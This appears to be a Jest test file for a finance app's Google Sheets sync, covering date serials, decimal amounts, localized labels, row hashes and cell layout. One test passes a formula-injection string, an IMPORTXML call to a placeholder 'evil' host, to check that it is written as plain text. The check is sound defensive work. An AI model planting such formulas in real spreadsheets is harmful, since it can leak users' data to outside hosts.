import { parseCalendarDate } from '../../finance/dates.js';
import { TEXTS } from '../spreadsheet-template.js';
import {
  amountOf,
  calendarDateOf,
  cellData,
  dateTimeToSerial,
  dateToSerial,
  enumOf,
  fold,
  integerOf,
  normalized,
  RowError,
  rowHash,
  tagsOf,
} from './cells.js';
import { cellRequests, layoutOf, rowsOf } from './sheet-sync.service.js';

const d = (text: string) => parseCalendarDate(text) as Date;

describe('dates', () => {
  it('converts calendar dates to Sheets serial numbers and back', () => {
    expect(dateToSerial(d('1900-01-01'))).toBe(2);
    expect(dateToSerial(d('2026-03-10'))).toBe(46091);
    expect(calendarDateOf(46091, 'x')).toBe('2026-03-10');
    expect(calendarDateOf(46091.75, 'x')).toBe('2026-03-10'); // time of day ignored
    expect(calendarDateOf('2026-03-10', 'x')).toBe('2026-03-10');
    expect(calendarDateOf(null, 'x')).toBeNull();
    expect(calendarDateOf('  ', 'x')).toBeNull();
  });

  it('refuses impossible or ambiguous dates', () => {
    for (const value of ['31/02/2026', '10/03/2026', '2026-02-30', 'amanhã', -999999]) {
      expect(() => calendarDateOf(value, 'occurred_on')).toThrow(RowError);
    }
  });

  it('writes date-times as the wall clock of the user time zone', () => {
    const instant = new Date('2026-03-10T15:30:00Z');
    expect(dateTimeToSerial(instant, 'America/Sao_Paulo')).toBeCloseTo(
      46091 + 12.5 / 24,
      6,
    );
    expect(dateTimeToSerial(instant, 'Asia/Tokyo')).toBeCloseTo(46092 + 0.5 / 24, 6);
  });
});

describe('amounts and numbers', () => {
  it('keeps the exact decimal text of number cells (no binary rounding)', () => {
    expect(amountOf(87.45, 'amount')).toBe('87.45');
    expect(amountOf(0.1 + 0.2, 'amount')).toBe('0.30000000000000004'); // refused later by decimals
    expect(amountOf(1000, 'amount')).toBe('1000');
    expect(amountOf('87,45', 'amount')).toBe('87.45');
    expect(amountOf(' 12.5 ', 'amount')).toBe('12.5');
    expect(amountOf(null, 'amount')).toBeNull();
  });

  it('refuses text that is not a plain number', () => {
    for (const value of ['R$ 10', '1.000,50', '1e3', 'abc', 1e21]) {
      expect(() => amountOf(value, 'amount')).toThrow(RowError);
    }
    expect(integerOf(10, 'closing_day')).toBe(10);
    expect(() => integerOf(10.5, 'closing_day')).toThrow(RowError);
  });
});

describe('lists and names', () => {
  const pt = TEXTS['pt-BR'].lists;
  const TYPES = ['INCOME', 'EXPENSE', 'INVESTMENT', 'TRANSFER'] as const;

  it('maps localized labels by position, ignoring case and accents', () => {
    expect(enumOf('Despesa', pt.transactionType, TYPES, 'type')).toBe('EXPENSE');
    expect(enumOf('  transferencia ', pt.transactionType, TYPES, 'type')).toBe(
      'TRANSFER',
    );
    expect(enumOf('EXPENSE', pt.transactionType, TYPES, 'type')).toBe('EXPENSE');
    expect(enumOf(null, pt.transactionType, TYPES, 'type')).toBeNull();
    expect(() => enumOf('Bitcoin', pt.transactionType, TYPES, 'type')).toThrow(
      expect.objectContaining({ code: 'invalid_option', column: 'type' }),
    );
    expect(fold('Alimentação')).toBe(fold('ALIMENTACAO'));
  });

  it('splits tags', () => {
    expect(tagsOf('casa, mês ,, viagem')).toEqual(['casa', 'mês', 'viagem']);
    expect(tagsOf(null)).toEqual([]);
  });
});

describe('hashes and literal writes', () => {
  it('hashes canonical values: blank equals empty, order of keys matters', () => {
    const keys = ['a', 'b'];
    expect(rowHash({ a: 'x', b: null }, keys)).toBe(rowHash({ a: ' x ', b: '' }, keys));
    expect(rowHash({ a: 1, b: null }, keys)).toBe(rowHash({ a: '1', b: null }, keys));
    expect(rowHash({ a: 'x', b: 'y' }, keys)).not.toBe(rowHash({ a: 'y', b: 'x' }, keys));
    expect(normalized(true)).toBe('TRUE');
  });

  it('never writes text as a formula', () => {
    expect(cellData('=IMPORTXML("http://evil","//a")')).toEqual({
      userEnteredValue: { stringValue: '=IMPORTXML("http://evil","//a")' },
    });
    expect(cellData(87.45)).toEqual({ userEnteredValue: { numberValue: 87.45 } });
    expect(cellData(null)).toEqual({});
  });
});

describe('sheet layout', () => {
  const layout = {
    sheetId: 7,
    title: 'Movimentações',
    rowCount: 1000,
    columns: new Map([
      ['description', 0],
      ['amount', 1],
      ['record_id', 3], // the user inserted a column at index 2
    ]),
  };

  it('reads rows by column key, skipping the header and blank rows', () => {
    const rows = rowsOf(
      [
        ['Descrição', 'Valor', 'Minha coluna', 'ID'],
        ['Mercado', 87.45, 'nota', 'A0EEBC99-9C0B-4EF8-BB6D-6BB9BD380A11'],
        [],
        ['', '', 'só minha coluna'],
        ['Nova', 10],
      ],
      layout,
    );
    expect(rows).toEqual([
      {
        index: 1,
        cells: {
          description: 'Mercado',
          amount: 87.45,
          record_id: 'A0EEBC99-9C0B-4EF8-BB6D-6BB9BD380A11',
        },
        id: 'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11',
      },
      {
        index: 4,
        cells: { description: 'Nova', amount: 10, record_id: null },
        id: null,
      },
    ]);
  });

  it('groups consecutive rows and columns and skips columns the user added', () => {
    const requests = cellRequests(layout, [
      { index: 5, cells: { description: 'b', amount: 2, record_id: 'id-b' } },
      { index: 4, cells: { description: 'a', amount: 1, record_id: 'id-a' } },
      { index: 9, cells: { description: 'c', amount: 3, record_id: 'id-c' } },
    ]);
    const starts = requests.map((request) => {
      const body = request.updateCells as {
        start: { rowIndex: number; columnIndex: number };
        rows: unknown[];
      };
      return [body.start.rowIndex, body.start.columnIndex, body.rows.length];
    });
    expect(starts).toEqual([
      [4, 0, 2], // rows 4-5, columns 0-1
      [4, 3, 2], // rows 4-5, column 3 (column 2 belongs to the user)
      [9, 0, 1],
      [9, 3, 1],
    ]);
  });

  it('requires every synced tab and column', () => {
    expect(() =>
      layoutOf({
        spreadsheetId: 'f',
        title: 't',
        locale: 'pt_BR',
        timeZone: 'UTC',
        metadataKeys: [],
        sheets: [],
      }),
    ).toThrow(expect.objectContaining({ status: 409 }));
  });
});
